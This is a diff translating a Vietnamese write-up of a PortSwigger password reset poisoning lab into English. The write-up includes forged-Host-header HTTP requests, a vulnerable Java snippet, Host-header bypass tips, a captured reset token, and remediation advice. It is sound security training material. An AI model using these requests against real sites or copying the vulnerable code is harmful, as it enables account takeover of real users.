@@ -1,7 +1,7 @@
 ---
 title: "[PortSwigger] Lab 1: Basic Password Reset Poisoning"
 date: 2026-09-14
-description: "Khai thác lỗ hổng Password Reset Poisoning thông qua việc can thiệp giá trị header Host để chiếm đoạt token đặt lại mật khẩu của người dùng."
+description: "Exploit Password Reset Poisoning by manipulating the HTTP Host header to intercept password reset tokens and achieve account takeover."
 categories: ["PortSwigger Labs"]
 series: ["HTTP Host Header Attacks"]
 series_order: 1
@@ -9,104 +9,104 @@ showAuthor: false
 showTableOfContents: true
 ---
 
-## Thông tin bài Lab
-* **Tên bài Lab**: Basic password reset poisoning
-* **Chuyên đề**: HTTP Host Header attacks / Account Takeover
-* **Mức độ**: Apprentice
-* **Mục tiêu**: Khai thác Password Reset Poisoning để đánh cắp token đặt lại mật khẩu và chiếm quyền tài khoản `carlos`.
+## Challenge Overview
+* **Challenge name**: Basic password reset poisoning
+* **Category**: HTTP Host Header attacks / Account Takeover
+* **Level**: Apprentice
+* **Objective**: Exploit Password Reset Poisoning to steal the password reset token and compromise the `carlos` account.
 
 ---
 
-## 1. Kiến thức nền tảng
+## 1. Core Fundamentals
 
-Chức năng đặt lại mật khẩu là một thành phần trọng yếu trong cơ chế quản lý danh tính của các ứng dụng web. Quy trình này đòi hỏi tính bảo mật tuyệt đối đối với token xác thực được gửi đến hộp thư của người dùng.
+Password reset functionality represents a critical component of identity management across web applications. This workflow demands absolute confidentiality and integrity regarding authentication tokens dispatched to user mailboxes.
 
-### 1.1. Quy trình xử lý yêu cầu đặt lại mật khẩu tiêu chuẩn
+### 1.1. Standard Password Reset Workflow
 
-Một quy trình đặt lại mật khẩu thông thường bao gồm các bước:
-- **Bước 1:** Người dùng gửi yêu cầu kèm theo tên đăng nhập hoặc địa chỉ email.
-- **Bước 2:** Hệ thống kiểm tra sự tồn tại của tài khoản, sinh ra một chuỗi token ngẫu nhiên có độ entropy cao và lưu trữ vào cơ sở dữ liệu kèm thời hạn hết hạn.
-- **Bước 3:** Máy chủ tạo đường dẫn chứa token và gửi nội dung này vào email của người dùng:
+A conventional password reset workflow typically involves the following lifecycle:
+- **Step 1:** The user initiates a request supplying their username or email address.
+- **Step 2:** The system verifies account existence, generates a high-entropy cryptographically secure pseudo-random token, and persists it in the database alongside an expiration timestamp.
+- **Step 3:** The server constructs a reset link embedding this token and transmits it to the user's registered email address:
 
 ```text
 https://example.com/forgot-password?temp-forgot-password-token=SECRET_TOKEN
 ```
 
-- **Bước 4:** Người dùng truy cập đường dẫn, gửi token lên máy chủ để được cấp quyền thiết lập mật khẩu mới.
+- **Step 4:** The user visits the link, submitting the token back to the server to establish a new password.
 
-### 1.2. Sai lầm kiến trúc dẫn đến Password Reset Poisoning
+### 1.2. Architectural Flaw Leading to Password Reset Poisoning
 
-Khi xây dựng đường dẫn gửi qua email, ứng dụng cần ghép tên miền của hệ thống vào trước đường dẫn tài nguyên. Thay vì sử dụng giá trị tên miền cố định được cấu hình trong biến môi trường máy chủ, lập trình viên lại đọc trực tiếp giá trị từ trường header Host của HTTP Request:
+When constructing the email link, the application must prepend the system's domain name to the resource path. Rather than relying on a static, trusted domain defined in server-side environment configurations, developers often dynamically retrieve the hostname directly from the HTTP request's `Host` header:
 
 ```java
-// Mã nguồn xử lý sai lầm phổ biến
+// Common vulnerable implementation
 String resetUrl = "https://" + request.getHeader("Host") 
                 + "/forgot-password?temp-forgot-password-token=" + token;
 emailService.sendResetEmail(user.getEmail(), resetUrl);
 ```
 
-Vì trường header Host hoàn toàn do client kiểm soát và có thể bị can thiệp bởi Burp Suite, việc tin tưởng trường này khiến ứng dụng vô tình tạo ra liên kết trỏ về máy chủ của kẻ tấn công.
+Because the `Host` header is entirely client-controlled and easily tampered with via an intercepting proxy such as Burp Suite, blindly trusting this value leads the application to generate a malicious link pointing directly to an attacker-controlled server.
 
 ---
 
-## 2. Mô hình tấn công
+## 2. Attack Architecture / Threat Model
 
-### 2.1. Phân tích nguyên nhân và điều kiện phát sinh lỗ hổng
+### 2.1. Root Cause and Vulnerability Preconditions
 
-- **Tin tưởng ngầm định Input:** Ứng dụng coi header Host là dữ liệu đáng tin cậy để tạo các liên kết nhạy cảm gửi ra bên ngoài.
-- **Thiếu danh sách tên miền hợp lệ:** Hạ tầng Web Server và Reverse Proxy không lọc hoặc từ chối các request chứa header Host lạ.
-- **Hành vi tự động của người dùng:** Nạn nhân mở email và nhấp vào liên kết mà không kiểm tra kỹ tên miền đích.
+- **Implicit Input Trust:** The application treats the `Host` header as a trusted source of truth when generating sensitive outbound links.
+- **Absence of Host Domain Whitelisting:** Web server and reverse proxy infrastructures fail to validate, sanitize, or reject incoming requests bearing arbitrary `Host` headers.
+- **User Trust Behavior:** The victim receives an official-looking email and clicks the poisoned link without scrutinizing the destination domain.
 
-### 2.2. Sơ đồ luồng dữ liệu tấn công
+### 2.2. Attack Flow Diagram
 
 ```text
 [ Attacker ]
        │
-       │  Gửi yêu cầu reset mật khẩu cho carlos:
+       │  Sends password reset request for carlos:
        │  POST /forgot-password HTTP/2
-       │  Host: exploit-server.net      <── Thay thế bằng domain của Attacker
+       │  Host: exploit-server.net      <── Replaced with Attacker domain
        │  username=carlos
        ▼
 [ Web Application Server ]
        │
-       │  Sinh token bí mật hợp lệ: TOKEN_XYZ
-       │  Ghép URL theo Host header:
+       │  Generates valid secret token: TOKEN_XYZ
+       │  Constructs URL dynamically via Host header:
        │  https://exploit-server.net/forgot-password?temp-forgot-password-token=TOKEN_XYZ
-       │  Gửi email chứa liên kết trên vào hòm thư nạn nhân
+       │  Dispatches email containing the link to victim's mailbox
        ▼
-[ Hòm thư của Carlos ]
+[ Carlos's Mailbox ]
        │
-       │  Carlos mở email và nhấp vào liên kết bị đầu độc
+       │  Carlos inspects email and clicks the poisoned link
        ▼
-[ Exploit Server của Attacker ]
+[ Attacker Exploit Server ]
        │
-       │  Ghi nhận request vào Access Log:
+       │  Logs incoming request in Access Log:
        │  GET /forgot-password?temp-forgot-password-token=TOKEN_XYZ HTTP/1.1
        ▼
-[ Attacker lấy Token ] ──► Đổi mật khẩu tài khoản Carlos ──► Chiếm đoạt tài khoản!
+[ Attacker Extracts Token ] ──► Resets Carlos's password ──► Full Account Takeover!
 ```
 
 > [!NOTE]
-> **Question 1: Tại sao dev lại không hardcode domain mà lại lấy từ Host header?**
+> **Question 1: Why don't developers hardcode the domain instead of reading from the Host header?**
 > 
-> **Answer 1:** Các dự án thực tế chạy trên nhiều môi trường như dev, staging, test, production hoặc kiến trúc Multi-tenant khi nhiều domain dùng chung một backend code. Lập trình viên thường ngại cấu hình biến môi trường `BASE_URL` riêng cho từng môi trường nên chọn giải pháp nhanh là đọc trực tiếp từ trường header `Host`, từ đó vô tình tạo ra lỗ hổng.
+> **Answer 1:** Real-world deployments often span multiple environments (dev, staging, QA, production) or operate in multi-tenant architectures where several domains share identical backend codebases. Developers frequently bypass configuring individual `BASE_URL` environment variables for each deployment, opting instead for the shortcut of dynamically reading the `Host` header, inadvertently introducing this severe vulnerability.
 > 
-> **Question 2: Nếu Web Server hoặc Reverse Proxy đứng trước chặn không cho đổi Host header thì sao?**
+> **Question 2: What if an upstream Web Server or Reverse Proxy prevents altering the Host header?**
 > 
-> **Answer 2:** Nếu Reverse Proxy kiểm tra nghiêm ngặt header `Host`, attacker sẽ chuyển hướng sang các kỹ thuật bypass nâng cao hơn:
-> - Sử dụng các header ghi đè của proxy như `X-Forwarded-Host`.
-> - Kỹ thuật Duplicate Host headers.
-> - Khai thác qua Forward Proxy hoặc SNI mismatch.
+> **Answer 2:** When front-end reverse proxies strictly validate the standard `Host` header, attackers pivot toward advanced evasion techniques:
+> - Utilizing proxy override headers such as `X-Forwarded-Host`.
+> - Employing duplicate `Host` headers.
+> - Exploiting discrepancies via forward proxies or SNI mismatches.
 
 ---
 
-## 3. Khai thác lỗ hổng
+## 3. Vulnerability Exploitation
 
-Quá trình thực nghiệm được triển khai tuần tự qua 5 giai đoạn:
+The exploitation process is executed methodically across five distinct phases:
 
-### Giai đoạn 1: Khảo sát quy trình đặt lại mật khẩu với tài khoản thử nghiệm
+### Phase 1: Baseline Analysis of the Password Reset Workflow
 
-Gửi request đặt lại mật khẩu cho tài khoản `wiener` qua Burp Suite Repeater:
+Dispatch a password reset request for the test account `wiener` using Burp Suite Repeater:
 
 ```http
 POST /forgot-password HTTP/2
@@ -116,25 +116,25 @@ Content-Type: application/x-www-form-urlencoded
 csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=wiener
 ```
 
-![Hình 1: Request gửi yêu cầu đặt lại mật khẩu cho tài khoản wiener](extracted_images/image1.png)
+![Figure 1: Password reset request dispatched for the wiener account](extracted_images/image1.png)
 
-Kiểm tra hộp thư của wiener trên Email Client, email chứa liên kết đặt lại mật khẩu hợp lệ:
+Inspect Wiener's inbox on the simulated Email Client. The incoming message contains a legitimate reset link:
 
 ```text
 https://0a6a00ba0450131880ef178600140009.web-security-academy.net/forgot-password?temp-forgot-password-token=28fmtqhg74ekjf9g9ymp3iu9vxckmlck
 ```
 
-![Hình 2: Email nhận được chứa liên kết đặt lại mật khẩu có cấu trúc tên miền lấy từ Host header](extracted_images/image2.png)
+![Figure 2: Delivered email containing a reset link with the domain populated from the Host header](extracted_images/image2.png)
 
-Truy cập liên kết để kiểm tra biểu mẫu thiết lập mật khẩu mới của ứng dụng:
+Navigate to the provided link to inspect the application's password configuration interface:
 
-![Hình 3: Giao diện nhập mật khẩu mới sau khi xác thực token](extracted_images/image3.png)
+![Figure 3: New password submission form accessible post-token verification](extracted_images/image3.png)
 
 ---
 
-### Giai đoạn 2: Kiểm chứng tính phản xạ của Host header
+### Phase 2: Verifying Host Header Reflection
 
-Để chứng minh ứng dụng lấy giá trị tên miền động từ request, tiến hành gửi lại request với trường `Host: tu4nki3t`:
+To verify whether the application dynamically reflects arbitrary hostname values into generated links, re-send the request with an altered `Host: tu4nki3t` header:
 
 ```http
 POST /forgot-password HTTP/2
@@ -144,23 +144,23 @@ Content-Type: application/x-www-form-urlencoded
 csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=wiener
 ```
 
-Máy chủ phản hồi `HTTP/2 200 OK`. Tiếp tục kiểm tra hòm thư của wiener:
+The server returns an `HTTP/2 200 OK` response. Re-check Wiener's email inbox:
 
-![Hình 4: Request kiểm chứng với Host header tùy biến tu4nki3t](extracted_images/image4.png)
+![Figure 4: Verification request utilizing a custom Host header (tu4nki3t)](extracted_images/image4.png)
 
-Liên kết trong email đã bị thay đổi tên miền hoàn toàn theo giá trị đã can thiệp:
+The link within the email has been fully poisoned, directly adopting the injected hostname:
 
 ```text
 https://tu4nki3t/forgot-password?temp-forgot-password-token=nyv1624q9a50bpqbqyjpsauw980557co
 ```
 
-![Hình 5: Email nhận được phản xạ chính xác chuỗi tu4nki3t trong liên kết](extracted_images/image5.png)
+![Figure 5: Delivered email reflecting the exact tu4nki3t string within the reset URL](extracted_images/image5.png)
 
 ---
 
-### Giai đoạn 3: Tấn công đầu độc liên kết nhắm vào nạn nhân carlos
+### Phase 3: Poisoning Reset Links Targeted at Victim Carlos
 
-Xác định tên miền Exploit Server do bài lab cung cấp: `exploit-0a20004004e5131580c9162c01ff00ac.exploit-server.net`. Soạn request gửi yêu cầu đặt lại mật khẩu cho `username=carlos` với header Host trỏ về Exploit Server:
+Identify the unique Exploit Server hostname allocated for the lab: `exploit-0a20004004e5131580c9162c01ff00ac.exploit-server.net`. Craft a reset request targeting `username=carlos` with the `Host` header pointing to the Exploit Server:
 
 ```http
 POST /forgot-password HTTP/2
@@ -170,62 +170,62 @@ Content-Type: application/x-www-form-urlencoded
 csrf=kMq9RVeUxfQpLCIPJRKOJzxygHorbIzN&username=carlos
 ```
 
-Máy chủ xử lý thành công và gửi email chứa liên kết trỏ về Exploit Server vào hòm thư của carlos.
+The server processes the request successfully and transmits an email containing a link routed toward the Exploit Server directly into Carlos's inbox.
 
-![Hình 6: Request đầu độc Host header bằng domain Exploit Server cho tài khoản carlos](extracted_images/image6.png)
+![Figure 6: Host header poisoned with the Exploit Server domain for user carlos](extracted_images/image6.png)
 
 ---
 
-### Giai đoạn 4: Thu thập Token từ Access Log của Exploit Server
+### Phase 4: Harvesting the Token from Exploit Server Access Logs
 
-Nạn nhân carlos mở email và nhấp vào liên kết. Trình duyệt của nạn nhân gửi request trực tiếp đến Exploit Server. Kiểm tra mục **Access log**, ghi nhận bản ghi trích xuất token thành công:
+The victim Carlos reviews his inbox and clicks the poisoned link. The victim's browser initiates a direct HTTP request toward the Exploit Server. Access the **Access log** panel to observe the incoming entry and harvest the reset token:
 
 ```text
 10.0.4.19 2026-09-14 07:49:40 +0000 "GET /forgot-password?temp-forgot-password-token=pgus7rprrupslmrlyrxkzmbc3bxo2qj8 HTTP/1.1" 404 "user-agent: Mozilla/5.0 (Victim)..."
 ```
 
-Token thu được: `pgus7rprrupslmrlyrxkzmbc3bxo2qj8`
+Extracted Token: `pgus7rprrupslmrlyrxkzmbc3bxo2qj8`
 
-![Hình 7: Access Log ghi nhận request từ nạn nhân chứa token đặt lại mật khẩu](extracted_images/image7.png)
+![Figure 7: Access Log recording the victim's request containing the sensitive reset token](extracted_images/image7.png)
 
 ---
 
-### Giai đoạn 5: Đặt lại mật khẩu và chiếm quyền tài khoản carlos
+### Phase 5: Resetting the Password and Compromising Carlos's Account
 
-Sử dụng tên miền chính thống của bài lab kết hợp với token vừa thu thập để truy cập trang đặt lại mật khẩu:
+Construct the legitimate password reset URL using the original lab domain combined with the harvested token:
 
 ```text
 https://0a6a00ba0450131880ef178600140009.web-security-academy.net/forgot-password?temp-forgot-password-token=pgus7rprrupslmrlyrxkzmbc3bxo2qj8
 ```
 
-Thiết lập mật khẩu mới cho tài khoản carlos:
+Submit a new password for Carlos's account:
 
-![Hình 8: Nhập mật khẩu mới cho tài khoản carlos với token hợp lệ](extracted_images/image8.png)
+![Figure 8: Submitting a new password for the carlos account using the valid token](extracted_images/image8.png)
 
-Đăng nhập thành công với tài khoản carlos và mật khẩu vừa đặt. Bài lab được giải quyết hoàn tất.
+Authenticate successfully using the `carlos` username and the newly established credentials. The lab is completed.
 
-![Hình 9: Đăng nhập thành công vào tài khoản carlos và hoàn thành bài lab](extracted_images/image9.png)
+![Figure 9: Successful authentication as carlos solving the challenge](extracted_images/image9.png)
 
 ---
 
-## 4. Biện pháp khắc phục
+## 4. Remediation Strategies
 
-### 4.1. Khắc phục tại tầng Ứng dụng
+### 4.1. Application-Layer Remediation
 
-- **Sử dụng tên miền cấu hình tĩnh:** Tuyệt đối không lấy giá trị tên miền từ trường header Host hay bất kỳ thông tin nào do client gửi lên để sinh liên kết gửi qua email. Tên miền phải được lấy từ biến môi trường cố định của hệ thống:
+- **Enforce Static Domain Configuration:** Never derive the base URL from the incoming `Host` header or any client-supplied HTTP headers when generating outbound links. Domain names must be loaded strictly from immutable, verified environment configurations:
 
 ```java
-// Cấu hình an toàn sử dụng biến môi trường tĩnh
+// Secure implementation utilizing static configuration
 String baseUrl = System.getenv("APP_BASE_URL"); // https://example.com
 String resetUrl = baseUrl + "/forgot-password?temp-forgot-password-token=" + token;
 ```
 
-- **Giới hạn thời gian hiệu lực và số lần sử dụng:** Token đặt lại mật khẩu phải có thời gian sống ngắn và bị hủy bỏ ngay lập tức sau lần sử dụng đầu tiên.
+- **Enforce Short Lifespans and Single-Use Tokens:** Password reset tokens must possess a strictly bounded time-to-live (TTL) and be immediately invalidated upon first use or subsequent generation requests.
 
-### 4.2. Cấu hình bảo vệ tại Web Server và Reverse Proxy
+### 4.2. Web Server and Reverse Proxy Hardening
 
-- **Xác thực tên miền tại Reverse Proxy:** Cấu hình Nginx, Apache hoặc API Gateway kiểm tra trường header Host và từ chối các yêu cầu có tên miền không nằm trong danh sách cho phép trước khi chuyển tiếp vào ứng dụng nội bộ.
-- **Thiết lập Virtual Host mặc định:** Cấu hình server block mặc định để đóng kết nối đối với các request không xác định tên miền đích:
+- **Validate Hostnames at Reverse Proxies:** Configure Nginx, Apache, or API Gateways to strictly inspect the `Host` header against an explicit domain whitelist, rejecting unrecognized hostnames prior to forwarding traffic to upstream backend applications.
+- **Configure Default Virtual Hosts:** Define a catch-all default server block configured to immediately drop unrouted or ambiguous connections:
 
 ```nginx
 server {
